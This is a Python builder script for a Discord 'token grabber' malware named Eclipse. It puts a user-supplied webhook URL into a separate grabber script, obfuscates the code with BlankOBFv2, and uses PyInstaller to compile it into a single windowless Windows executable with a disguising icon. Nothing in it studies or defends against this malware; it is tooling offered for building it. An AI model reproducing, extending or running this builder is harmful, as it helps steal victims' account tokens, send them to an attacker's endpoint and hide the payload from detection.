import os
import subprocess
from os import remove as delete_file, path
from cryptography.fernet import Fernet
from argparse import ArgumentParser, Namespace
from subprocess import run, PIPE
from colorama import Fore, Style
from BlankOBFv2 import BlankOBFv2

ly = Fore.LIGHTYELLOW_EX
oa = Fore.LIGHTMAGENTA_EX
ob = Fore.LIGHTBLUE_EX
re = Fore.RESET
gr = Fore.LIGHTGREEN_EX

good = f"{Fore.GREEN}[+]{Style.RESET_ALL}"
bad = f"{Fore.RED}[-]{Style.RESET_ALL}"

start_banner = F'''███████╗ ██████╗██╗     ██╗██████╗ ███████╗███████╗    ███████╗████████╗███████╗ █████╗ ██╗     
██╔════╝██╔════╝██║     ██║██╔══██╗██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     
█████╗  ██║     ██║     ██║██████╔╝███████╗█████╗      ███████╗   ██║   █████╗  ███████║██║     
██╔══╝  ██║     ██║     ██║██╔═══╝ ╚════██║██╔══╝      ╚════██║   ██║   ██╔══╝  ██╔══██║██║     
███████╗╚██████╗███████╗██║██║     ███████║███████╗    ███████║   ██║   ███████╗██║  ██║███████╗
╚══════╝ ╚═════╝╚══════╝╚═╝╚═╝     ╚══════╝╚══════╝    ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝
                                                                                                '''

grabber_path = path.join("code", "eclipse-grabber.py")
fernet_key = Fernet.generate_key().decode()

cur_dir = os.getcwd()

def install_packages():
    """Install required packages if not already installed."""
    try:
        import cryptography
        import colorama
    except ImportError:
        print("[🛠️] Required libraries not found, installing...")
        subprocess.check_call(['pip', 'install', 'cryptography', 'colorama'])

def clear_screen():
    """Clear the console screen."""
    os.system("cls")

def build(webhook: str, out_file: str, debug: bool):
    """Build the executable file with encrypted content."""
    of = f"{out_file}.py"
    ot = f"{out_file}.exe"
    with open(grabber_path, 'r') as code_file:
        code = code_file.read()

    code = code.replace("{WEBHOOK}", str(webhook)).replace("https://discord.com/api/webhooks/", str(webhook))
    code = BlankOBFv2(code=code, include_imports=True, recursion=1).obfuscate()

    with open(of, 'w') as build_file:
        build_file.write(code)

    # Compile command for Windows
    compile_command = ["pyinstaller.exe"]
    compile_command += [of, "--onefile", "--noconsole", "--hidden-import=_cffi_backend", f"--icon={path.join('img', 'exe_file.ico')}"]
    
    if debug:
        compile_command.remove("--noconsole")
        
    try:
        command_result = run(args=compile_command, stdout=PIPE, stderr=PIPE)
        result = str(command_result.stderr).replace("b\"", "").replace(r'\n', '\n').replace(r'\r', '\r')
        
        if "completed successfully" not in result:
            raise Exception(result)
    except Exception as error:
        exit(f"\n{bad} Build Error: {error}\n")
    try:
        delete_file(out_file+".py")
        delete_file(out_file+".spec")
        
        print(f"[🪐] File is at ./dist!")
        os.system(f'rd /s /q build')
        print(f"[💥] Removed build folder!")
        print("[✨] Opening the folder...")
        os.chdir("./dist")
        os.system(f'explorer .')
        
    except (FileNotFoundError, PermissionError):
        pass

def get_args() -> Namespace:
    """Parse command line arguments."""
    parser = ArgumentParser(description='Eclipse Token Grabber Builder')
    parser.add_argument('-w', '--webhook', help='add your webhook url', default='', required=True)
    parser.add_argument('-o', '--filename', help='name your executable', default='', required=True)
    parser.add_argument('-d', '--debug', help='enable debug mode', nargs='?', const=True, default=False)
    clear_screen()
    print(start_banner)
    return parser.parse_args()

def delete_virtual_env():
    """Delete the virtual environment."""
    venv_dir = "venv"
    if path.exists(venv_dir):
        print(f"[🧹] Deleting virtual environment at {venv_dir}")
        os.system(f'rd /s /q {venv_dir}')

def main(args: Namespace):
    """Main function to coordinate the build process."""
    install_packages()
    clear_screen()
    print(start_banner)
    print(f"[🔒] Encryption Key: {fernet_key}")
    print(f"[🏗️] Building the Token Grabber, please wait. . .")
    build(args.webhook, args.filename, args.debug)
    print(f"[🧳] Successfully Built the Grabber!\n")

if __name__ == "__main__":
    main(get_args())
